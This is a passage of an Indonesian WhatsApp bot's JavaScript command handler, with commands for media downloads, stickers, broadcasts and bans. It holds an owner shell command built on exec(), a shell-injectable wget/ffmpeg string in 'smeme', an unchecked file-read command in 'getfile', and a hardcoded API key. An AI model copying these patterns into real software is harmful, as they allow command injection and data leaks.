setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break
case  'playmp3':
if (!isGroup) return setReply(mess.only.group)
if(!isUrl) return setReply("Masukan link")
try{
setReply("*Downloading...*")
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
if(audioFormats[0].contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]	
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload audio lebih dari 10 menit")
}
downloadMp3(q) 
} catch (err){
console.log(err)
}
break
	
		
		
case  'playmp4':{
if (!isGroup) return setReply(mess.only.group)
if(!isUrl) return setReply("Masukan link")
let info = await ytdl.getInfo(q);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
if(format.contentLength == "undefined"){
var rus = await yts(q)
var data = await rus.all.filter(v => v.type == 'video')
var res = data[0]
if(res.timestamp.split(":") > "10") return setReply("Tidak bisa mendownload video lebih dari 10 menit")
}
setReply("*Downloading...*")
downloadMp4 (q) 
}
break   

case 'addcmd': 
			case 'setcmd':{
                  if (!isOwner) return setReply(mess.only.owner)
                  if (isQuotedSticker) {
                  if (!q) return setReply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
                  var kodenya = m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
                  addCmd(kodenya, q)
                  setReply("Success")
                  } else {
                  setReply('tag stickenya')
                  }
                  }
            break
	
case 'public':
if (!isOwner) return onlyOwner()
if (publik) return setReply('Udah di mode publick kak')
publik = true
let bab =`Mode public aktif kak`
setReply(bab)
break
			   
case 'self':
if (!isOwner) return onlyOwner()
if (publik == false) return setReply('Udah di mode self kak')
publik = false
let breh =`Mode self aktif kak`
setReply(breh)
break


case '$':{
if (!itsMe && !isOwner) return onlyOwner()
await setReply("_Executing..._")
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
if (stdout) {
await setReply(`*>_ Console*\n\n${stdout}`)
}
})
}
break

case 'banchat':{
if (!isOwner) return onlyOwner()
if (!isGroup) return setReply(mess.only.group)
if (isBanchat) return setReply(`udah di ban`)
db.data.chats[from].banchat = true
setReply(`Bot berhasil Ban di group ini`)
}
break

case '3000years':
case 'approved':
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
if (!isGroup) return setReply(mess.only.group)
if (isQuotedImage) {
try{
let ahah = await conn.downloadAndSaveMediaMessage(quoted)
let owgi = await TelegraPh(ahah)
let ini_gen = `${command}`
ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
//conn.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: m})
conn.sendMessage(from, {conteximg, image: gambar, caption: `*${mess.success}*`}, { quoted: m })
fs.unlinkSync(ahah) 
})
}catch(err){
console.log(err)
}
} else if (isQuotedTag || isQuotedReply) {
setReply(mess.wait)
let ghost = users 
let oppp = await conn.profilePictureUrl(ghost, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let ini_gen = `${command}`
ameApi.generate(ini_gen, {
url : oppp
}).then(gambar => {
//conn.sendMessage(from, {image: gambar, caption: "Nih" }, {quoted: m})
conn.sendMessage(from, { conteximg, image: gambar, caption: `*${mess.success}*`}, { quoted: m })
}).catch(err => {
setReply(`${err}`)
});    
} else {
setReply("Tag atau Reply targetnya")
}
break


case 'fb': case 'facebook':{ 
if (!isGroup) return setReply(mess.only.group)
if (!args[0]) return setReply('Putting *URL* Facebook..')
  const {facebookDl} = await import('./scraper.js')
  const {savefrom} = await import('@bochilteam/scraper')
	let res = await facebookDl(args[0]).catch(async _ => await savefrom(args[0])).catch(_ => null)
	if (!res) throw 'Can\'t download the post'
	let url = res?.url?.[0]?.url || res?.url?.[1]?.url || res?.['720p'] || res?.['360p']
	await setReply(mess.wait)
	conn.sendMessage(m.chat, { video: { url }, caption: res?.meta?.title || '' }, { quoted: m })
}
break
		
case 'ig': 
case   'instagram':{
if (!isGroup) return setReply(mess.only.group)
try{
if(!q) return setReply("Masukan Link")
setReply(mess.wait)
if (!args[0].match(/https:\/\/www.instagram.com\/(p|reel|tv)/gi)) return setReply( `*Link salah! Perintah ini untuk mengunduh postingan ig/reel/tv, bukan untuk highlight/story!*\n\ncontoh:\n${prefix + command} https://www.instagram.com/p/BmjK1KOD_UG/?utm_medium=copy_link`)
const {instagramdlv3} = await import("@bochilteam/scraper")
let igreel = q.includes("https://www.instagram.com/reel/")
let results = await instagramdlv3(args[0])
for (const { url } of results) await conn.sendMedia(from, url, m, {caption: "*╌╌「 SUCCES 」╌╌*"})
} catch(err){
const instagramGetUrl = require('instagram-url-direct')
const results = (await instagramGetUrl(args[0])).url_list[0]
conn.sendFile(m.chat, results, 'instagram.mp4', `*INSTAGRAM DOWNLOADER*`, m)
}
}
break

case 'restart':{
if (!isOwner && !itsMe) return setReply(mess.only.owner)
await conn.sendMessage(from, {text: `_Restarting ${fake}_`})
await conn.sendMessage(from, {text: "_Succes_"})
await sleep(1000)
process.send('reset') 
}
break
case 'tiktok': {
                if (!text) return setReply('Link TikTok Ya Mana?')
                m.reply(mess.wait)
                let anu = await fdl.downloader.tiktok(text)
                conn.sendMessage(m.chat, { video: { url: anu.nowm} }, {
                    quoted:m
                })
            }
            break
            case 'tiktokmp3':
            case 'tiktokaudio': {
                if (!text) return setReply('Link TikTok Ya Mana?')
                m.reply(mess.wait)
                let anu = await fdl.downloader.tiktok(text)
				let cap = `👤 *Author:* ${anu.author}\n📌 *Title:* ${anu.title}\n🔗 Download From ${text}`
				conn.sendMessage(m.chat, { caption: cap, image: { url: anu.thumbnail }})
				conn.sendMessage(m.chat, { audio: { url: anu.audio }, mimetype: 'audio/mpeg'}, { quoted:m })
				}
				break      
	
/*  case 'tiktokmusik': case 'tiktokmp3': case 'tiktokaudio':{ 
  if (!isGroup) return setReply(mess.only.group)
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
setReply(mess.wait)
  const {tiktokdlv2} = await import('@bochilteam/scraper')
tiktokdlv2(lin).then( async res => {
let ep = res.video.no_watermark                    
let nana = await getBuffer(ep)
let ran = getRandom('.mp3')
let ron = getRandom('.mp4')
fs.writeFileSync(ron, nana)
exec(`ffmpeg -i ${ron} -vn ${ran}`, (err) => {
fs.unlinkSync(ron)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buffer453, mimetype: 'audio/mp4'}, { quoted: dev })
fs.unlinkSync(ran)
})
})
}
 break
case 'tiktoknowm': 
  case 'tt':
case 'tiktok':{ 
if (!isGroup) return setReply(mess.only.group)
  try{
if (args.length < 1) return setReply('Link?')
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
if(q.startsWith("https://vt.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://vm.tiktok.com/")){
var lin = args[0]
} else if(q.startsWith("https://www.tiktok.com/")){
var lin = args[0]
} else {
return setReply("Masukan link tikok, contoh https://vt.tiktok.com/")
}
setReply(mess.wait)
const {tiktokdl} = await import('@bochilteam/scraper')
tiktokdl(lin).then(res => {
let ep = res.video.no_watermark
conn.sendMessage(from, {caption: "Nih", video: {url: ep}},{quoted: m})
})
} catch (err){
setReply(mess.error.link)
  }
}
break
case 'tiktoknowm': 
  case 'tt':
case 'tiktok':{ 
       if (!args[0]) throw `contoh:\n ${prefix}${command} https://www.tiktok.com/@omagadsus/video/7025456384175017243`
    m.reply(mess.wait)
    let res = await axios.get(`https://api.caliph.biz.id/api/tiktok?url=${args[0]}&apikey=${global.caliphkey}`)
    let resvideo = res.data.data.video.noWatermark
    let result = `Like; ${res.data.data.stats.likeCount}\nCommand; ${res.data.data.stats.commentCount}`
  console.log(res)
    conn.sendMessage(m.chat, {video: {url: resvideo}, caption:result}, {quoted: m }) 
} catch (e) {
            m.reply('_Failed For sendding media :(_')
            }
}
break
*/

case 'twitter': {
if (!isGroup) return setReply(mess.only.group)
if (!q) throw setReply('Input URL')
async function twitterDl(url) {
let id = /twitter\.com\/[^/]+\/status\/(\d+)/.exec(url)[1]
if (!id) throw 'Invalid URL'
let res = await fetch(`https://tweetpik.com/api/tweets/${id}`)
if (res.status !== 200) throw res.statusText
let json = await res.json()
if (json.media) {
let media = []
for (let i of json.media) {
if (/video|animated_gif/.test(i.type)) {
let vid = await (await fetch(`https://tweetpik.com/api/tweets/${id}/video`)).json()
vid = vid.variants.pop()
media.push({
url: vid.url,
type: i.type
})
} else {
media.push({
url: i.url,
type: i.type
})
}
}
return {
caption: json.text,
media 
}
} else throw 'No media found'
}
	
	
let res = await twitterDl(q)
await m.reply('_In progress, please wait..._')
for (let x = 0; x < res.media.length; x++) {
let caption = x === 0 ? res.caption.replace(/https:\/\/t.co\/[a-zA-Z0-9]+/gi, '').trim() : ''
//conn.sendFile(m.chat, res.media[x].url, '', caption, m)
conn.sendMedia(from, res.media[x].url, m, {caption: caption})
}
}
break


case 'sfile': {
if (!isGroup) return setReply(mess.only.group)
async function sfileSearch(query, page = 1) {
let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
let $ = cheerio.load(await res.text())
let result = []
$('div.list').each(function () {
let title = $(this).find('a').text()
let size = $(this).text().trim().split('(')[1]
let link = $(this).find('a').attr('href')
if (link) result.push({ title, size: size.replace(')', ''), link })
})
return result
}
	
async function sfileDl(url) {
let res = await fetch(url)
let $ = cheerio.load(await res.text())
let filename = $('div.w3-row-padding').find('img').attr('alt')
let mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
let filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
let download = $('#download').attr('href') + '&k=' + Math.floor(Math.random() * (15 - 10 + 1) + 10)
return { filename, filesize, mimetype, download }
}
		
if (q.match(/(https:\/\/sfile.mobi\/)/gi)) {
let res = await sfileDl(q)
if (!res) return setReply('Error :/')
await setReply(Object.keys(res).map(v => `*• ${v}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype: res.mimetype }, { quoted: m })
} else if (q) {
let [query, page] = q.split`|`
let res = await sfileSearch(query, page)
if (!res.length) return setReply( `Query "${text}" not found :/`)
let rus = res.map((v) => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
setReply(rus)
} else return setReply( 'Input Query / Sfile Url!')
}
break
case 'emojimix': {
if (!isGroup) return setReply(mess.only.group)
let [emoji1, emoji2] = q.split`+`
if (!emoji1) return setReply( `Example : ${prefix + command} 😅+🤔`)
if (!emoji2) return setReply( `Example : ${prefix + command} 😅+🤔`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
await conn.sendImageAsSticker(from, res.url, dev)
  //conn.sendStimg(from, res.url, dev)
//await fs.unlinkSync(encmedia)
}
}
break

case 'yts':
case 'ytsearch':
try {
if (!q) return setReply('Apa yg mau dicari !')
reply('Wait kak sedang mencari')
let rus = await yts(q)
let  res = await rus.all.filter(v => v.type == 'video')
let videoID = res[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
const inithumb = await getBuffer(thumbnya)
let teks = `*─────〈〈️  YOUTUBE SEARCH 〉〉─────*\n\n`
for (let i of res) {
teks += `∘ Title : ${i.title}
∘ Views : ${i.views}
∘ Upload : ${i.ago}
∘ Durasi : ${i.timestamp}
∘ Channel : ${i.author.name}
∘ Link : ${i.url}\n`
}
let b = teks.trim()
xdev.sendMessage(from, { contextInfo: { forward,externalAdReply: {showAdAttribution: true, 
title: `「 ${week} , ${calender} 」`,body: `© Hashira Botz`,//description: 'Fuck',
mediaType: 1,  renderLargerThumbnail : true,thumbnail: inithumb,mediaUrl: res.url,sourceUrl: res.url}
}, text:teks},{quoted: dev})                                          
} catch (e) {
console.log(e)
setReply(`${e}`)
}
break  
case 'tts':
if (!isGroup) return setReply(mess.only.group)
const gtts = require( 'node-gtts')
function tts(text, lang = 'id') {
 // console.log(lang, text)
  return new Promise((resolve, reject) => {
    try {
      let tts = gtts(lang)
      let filePath =  (1 * new Date) + '.mp3'
      tts.save(filePath, text, () => {
        resolve(fs.readFileSync(filePath))
        fs.unlinkSync(filePath)
				
      })
    } catch (e) { reject(e) }
  })
}    

const defaultLang = 'id'


  let lang = args[0]
  let text = args.slice(1).join(' ')
  if ((args[0] || '').length !== 2) {
    lang = defaultLang
    text = args.join(' ')
  }
  if (!text && m.quoted?.text) text = m.quoted.text

  let ras
  try { ras = await tts(text, lang) }
  catch (e) {
    m.reply(e + '')
    text = args.join(' ')
    if (!text) setReply( `Use example ${prefix}${command} en hello world`)
    ras = await tts(text, defaultLang)
  } finally {
    console.log(ras)
    if (ras) //xdev.sendMedia(from, ras, dev, {caption: "Nih"})
    conn.sendMessage(m.chat, {audio: ras,ptt: true, waveform:  [
0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  9,
35, 51, 67, 73, 73, 25, 18, 58, 75, 72, 26,  0,
27, 56, 58, 43, 12, 23, 35, 49, 62, 67, 63, 18,
2, 16, 39, 45, 43, 31, 21, 36, 57, 71, 70, 67,
23, 49, 36,  6, 17, 39, 50, 52, 45, 27, 26, 50,
51, 49, 49, 49
], mimetype: 'audio/mpeg'}, {quoted: m }) 
//conn.sendFile(m.chat, res, 'tts.opus', null, m, true)
  }
 
break
    
case 'setppbot':{
if (!isOwner) return setReply(mess.only.owner)
if (isImage || isQuotedImage) {
if(q == 'full'){
const media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
const { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})       
await setReply("Sukses")    
} else{
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let data =  await conn.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
setReply(`Sukses`)
}
} else  {
setReply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
}
}
break


case 'join':{
if(!isOwner) return setReply(mess.only.owner)
let link = q.startsWith("http")
if(!link) return setReply(`Kirim perintah ${command} _linkgrup_`)
let Url = args[1]
let ano = q.split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(ano)
setReply("Sukses join group")
}
break


case 'bcgc':{
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return setReply('Teksnya?')
let getGroups = await conn.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
setReply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
let muk = [{urlButton: {displayText: `ORDER`,url: `https://wa.me/6282142108243?text=Assalamualaikum`}}]
let teks = `*BROADCAST GROUP*\n\n${q}`

for (let i of anus) {
let toks = `┏━ ❮❮ 𝙼𝙴𝚂𝚂𝙴𝙶𝙴 ❯❯
┣❲  ${q}
┖─┅┈⸔⸔⬫
┏┬┬┬┬┬┬┬┬┬┬┬┬┬⁛⸙⸙
┃⫹⫺ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime(process.uptime())}
┃⫹⫺ 𝙳𝚊𝚝𝚎 : ${calender}
┃⫹⫺ 𝚝𝚒𝚖𝚎 :${moment().tz('Asia/Jakarta').format('HH:mm:ss')}
┖──┈┈┈〠⸙࿉༐`
let teks2 = `*_Broadcast Group_*\n\n`
await sleep(1000)
await conn.reply(i, teks2, q, m) 
}
setReply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break
case 'qc':{
	try{
const sender = (dev.quoted?.text ? dev.quoted : dev).sender
const name = await conn.getName(sender)
let teks = m.quoted ? m.quoted.text : q ? q : ""
const avatar = await conn.profilePictureUrl(sender, "image").catch(_ => "https://telegra.ph/file/89c1638d9620584e6e140.png")

if (isImage || isQuotedImage){
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let anu = await TelegraPh(media)
const json = { type: "quote", format: "png", backgroundColor: "#FFFFFF", width: 512, height: 768,  scale: 2, messages: [{ entities: [], media: { url: anu }, avatar: true, from: { id: 1, name, photo: { url: avatar }}, text: `${teks}`, replyMessage: {} }]}
 const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
    headers: {
      "Content-Type": "application/json"
    }
  }).catch(e => e.response || {})
  if(!data.ok) throw data
const buffer = Buffer.from(data.result.image, "base64")
makeSticker(buffer,Sticker, StickerTypes)
} else {
const json = { type: "quote", format: "png", backgroundColor: "#FFFFFF", width: 512, height: 768,  scale: 2, messages: [{ entities: [], avatar: true, from: { id: 1, name, photo: { url: avatar }}, text: `${teks}`, replyMessage: {} }]}
const { data } = await axios.post("https://bot.lyo.su/quote/generate", json, {
    headers: {
      "Content-Type": "application/json"
    }
  }).catch(e => e.response || {})
  if(!data.ok) reply( data)
const buffer = Buffer.from(data.result.image, "base64")
makeSticker(buffer,Sticker, StickerTypes)
}
} catch (e){
    console.log(e)
   // reply (`${e}`)
	setReply ('System erorr coba lgi')
	return
	}
}
break

case 'listgc': {
if(!isOwner) return setReply(mess.only.owner)
let getGroups = await conn.groupFetchAllParticipating()
 //console.log(getGroups)
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
for (let i of anu) {
let metadata2 = await conn.groupMetadata(i)
teks += `${app} Nama : ${metadata2.subject}\n${app} Owner : ${metadata2.owner !== undefined ? '@' + metadata2.owner.split`@`[0] : 'Tidak diketahui'}\n${app} ID : ${metadata2.id}\n${app} Dibuat : ${moment(metadata2.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n${app} Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
 }
conn.sendTextWithMentions(from, teks, m)
}
break

    case 'smeme': case 'stickermeme':{
    if (!isGroup) return setReply(mess.only.group)
if(!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
var top = q.split('|')[0] ? q.split('|')[0] : ''
var bottom = q.split('|')[1] ? q.split('|')[1] : ''           
if (isQuotedImage ) {
setReply(mess.wait)

try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await conn.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){
let olalah = await conn.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await conn.sendMessage(from,{sticker: fs.readFileSync(rano)}, {quoted: dev})
await fs.unlinkSync(rano)
await fs.unlinkSync(ranp)
})
}
} else {
setReply(`Kirim foto nya! Lalu reply fotonya dengan caption ${prefix}smeme ${pushname}`)
}
}
break    

case 'listpc': {
if(!isOwner) return onlyOwner()
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
for (let i of anu) {
let nama = store.messages[i].array[0].pushName
teks += `◉ Nama : ${nama}\n◉ User : @${i.split('@')[0]}\n◉ Chat : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
conn.sendTextWithMentions(from, teks, dev)
 }
break
case 'tomp3':
if (!isGroup) return setReply(mess.only.group)
if (isQuotedVideo || isVideo) {
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let buffer453 = fs.readFileSync(ran)
await conn.sendMessage(from, {mimetype: 'audio/mp4', audio: buffer453}, { quoted: m })
fs.unlinkSync(run)
})
} else {
setReply("Reply videonya")
}
break


case 'mediafire':{
if (!isGroup) return setReply(mess.only.group)
if(!q) return setReply("masukan link")
const {mediafiredl} = require('@bochilteam/scraper')
if(q.startsWith("https://www.mediafire.com")){
let nana = await mediafiredl(q)
if(nana.filename == "") return setReply("Error itu bukan file, kalo ga tau cara make mediafire mending ga usah make") 
console.log(nana)
let tuks =`
Data succesfull obtained
	
File Name : ${nana.filename}
File Size : ${nana.filesizeH}
Upload : ${nana.aploud}
`
await setReply(tuks)
if(nana.filesize > 90000 && !isOwner){
if(sender.startsWith("62")){
let tukss = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
let alasan = "Menyalahgunakan fitur mediafire"
_ban.add(pushname,calender,senderNumber,alasan,ban)
await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 90mb")              
await setReply(tukss)
return
}
await conn.sendMedia (from, nana.url, m, {fileName: nana.filename})
} else{
setReply("Link Invalid")
}
}
}
break

case 'delsampah':{
let directoryPath = path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return setReply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm")   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return setReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
setReply(teks) 
await sleep(2000)
setReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(file)
});
await sleep(2000)
setReply("Berhasil menghapus semua sampah")     
});
}
break  


case 'dashboard':{
//const d = (await import("lowdb")).default;
const getFolderSize = (await import("get-folder-size")).default;
let storage = await getFolderSize.loose('.');
let moduls = await getFolderSize.loose('./node_modules');
let session = await getFolderSize.loose('./session')
let databse = await getFolderSize.strict('./database/database.json');
for (let i of hitnya){
let cekvipp = ms(i.expired - Date.now())
var resetnye = `${cekvipp.hours} jam ${cekvipp.minutes} menit`             
	 } 
	 
let teks =`
*Dashboard*     
Runtime : ${runtime(process.uptime())}
Reset : ${resetnye}
Total Hit : ${thisHit.toLocaleString()}
	
*Storage*
Internal : ${FileSize(storage)}
Modules : ${FileSize(moduls)}
Session : ${FileSize(session)}
Database : ${FileSize(databse)}
`
let fall ="*Commands Today*  \n"
let totalFail =[]
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function(e, i){
fall += "*•*"+` ${e.cmd} : ${e.succes+e.failed} \n`   
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
});
		 
for(let i = 0; i < totalFail.length; i++){
total += totalFail[i]
} 
	
for(let a = 0; a < totalSuc.length; a++){
tot += totalSuc[a]
} 
	 
let akoh = `Total : ${dash.length} used`
let tod ="*Command Failed*\n"
let filteredArray = await dash.filter(item => item.failed > 0 )
await filteredArray.map(async function(e, i){
tod += "*•*"+` ${e.cmd} : ${e.failed} \n`   
	
});
let aw = `Total : ${filteredArray.length} failed`    
let tekz = teks+"\n\n"+fall+"\n"+akoh+"\n\n"+"*Command Status* \n"+" *•* Succes : "+tot+"\n"+" *•* Failed : "+total+"\n\n"+tod+"\n\n"
setReply(tekz)                                                        
}
break
case 'linkgc':{
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)		
try {
var pp_grup = await xdev.profilePictureUrl(from, 'image')
} catch (e) {
var pp_grup = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
}
var ppGc = await getBuffer(pp_grup)
let _meta = await xdev.groupMetadata(from)
console.log(_meta)
var url = await xdev.groupInviteCode(from).catch(() => reply(mess.error.api))
let asu = `*Group Description :* \n\n${_meta.desc}\n\n*Link :* https://chat.whatsapp.com/`+url
xdev.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${week} , ${calender}`,body: `${fake1}`,mediaType: 1,  renderLargerThumbnail : true,
thumbnail: ppGc,
sourceUrl: `https://chat.whatsapp.com/`+url,                
}								 
}, text: asu }, {quoted : dev})
}
break				
case 'gitclone':
if (!isGroup) return setReply(mess.only.group)
try{
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let Url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(Url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
setReply(`*Mohon tunggu, sedang mengirim repository..*`)
await conn.sendMedia (from, Url, m, {fileName: filename})
} catch (err){
setReply(mess.error.link)
}
break 
  
case 'getfile':{
if(!q) return setReply("Mau cari file apa")
let format = q.split(".")[1]
if(!format) return setReply('Tipe file js atau json?')
let mimetype = format == "js"?  'text/javascript' : format == "json"? 'application/json' : ""
let jpegThumbnail = fs.readFileSync("./stik/thumbnaildokumen.jpg")
setReply("Getting File...")
await sleep(2000)

let data1 = await fs.existsSync(`./database/${q}`)
let data2 = await fs.existsSync(`./message/${q}`)
let data3 = await fs.existsSync(`./lib/${q}`)
let data4 = await fs.existsSync(`./${q}`)
let data5 = await fs.existsSync(`./stik/${q}`)
  
if(data1) {	
let file = fs.readFileSync(`./database/${q}`)
conn.sendMessage(m.chat, { document: file, fileName: q, mimetype,  jpegThumbnail  }, { quoted: m })
} else if(data2) {	
let file = fs.readFileSync(`./message/${q}`)
conn.sendMessage(m.chat, { document: file, fileName: q, mimetype,  jpegThumbnail  }, { quoted: m })
} else if(data3) {
let file = fs.readFileSync(`./lib/${q}`)
conn.sendMessage(m.chat, { document: file, fileName: q, mimetype,  jpegThumbnail }, { quoted: m })
} else if(data4) {
let file = fs.readFileSync(`./${q}`)
conn.sendMessage(m.chat, { document: file, fileName: q, mimetype,  jpegThumbnail }, { quoted: m })
} else if(data5) {	
let file = fs.readFileSync(`./stik/${q}`)
  
if(format == "mp4"){
conn.sendMessage(m.chat, { video: file},{ quoted: m }) 
} else conn.sendMessage(m.chat, {image: file},{ quoted: m })
  
} else setReply("File not found")

}
break
    
case 'getcase':
try{
if (!m.key.fromMe && !isOwner) return setReply(mess.only.owner)
if (!q) return setReply("*Mau nyari Case apa kak*") 
if(q.startsWith(prefix)) return setReply("Query tidak boleh menggunakan prefix")
let nana = await getCase(q)
setReply(nana)
} catch(err){
console.log(err)
setReply(`Case ${q} tidak di temukan`)
}
break 

case 'setthumb':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/thumb.jpeg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image thumb`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setthumb`);
}
}
break

case 'ban':
case    'banned':{
let alasan = ""
if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
if (q.startsWith("+")) {
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "")
let Name = await conn.getName(woke)
if(_ban.check(woke, ban)) return setReply("User sudah di ban sebelumnya")
_ban.add(Name,calender,woke,alasan, ban)
setReply( `Berhasil banned ${woke}`);
} else if(users){
let alasan = mentionByReply? q : mentionByTag? q.split("|")[1] : ""
